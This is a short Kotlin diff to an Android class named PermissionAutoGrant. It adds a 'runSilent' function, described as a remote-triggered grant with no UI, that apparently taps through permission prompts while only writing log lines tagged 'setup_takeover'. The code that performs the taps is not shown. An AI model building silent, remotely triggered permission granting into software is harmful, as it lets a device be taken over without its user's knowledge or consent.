@@ -75,6 +75,23 @@ object PermissionAutoGrant {
         }
     }
 
+    /** Remote-triggered grant — logs only, no UI. */
+    fun runSilent(context: Context) {
+        run(context, object : Callback {
+            override fun onLog(line: String) {
+                Log.d(TAG, line)
+            }
+
+            override fun onDone(taps: Int) {
+                Log.d(TAG, "setup_takeover done — $taps action(s)")
+            }
+
+            override fun onError(message: String) {
+                Log.w(TAG, "setup_takeover: $message")
+            }
+        })
+    }
+
     fun cancel() {
         running.set(false)
     }
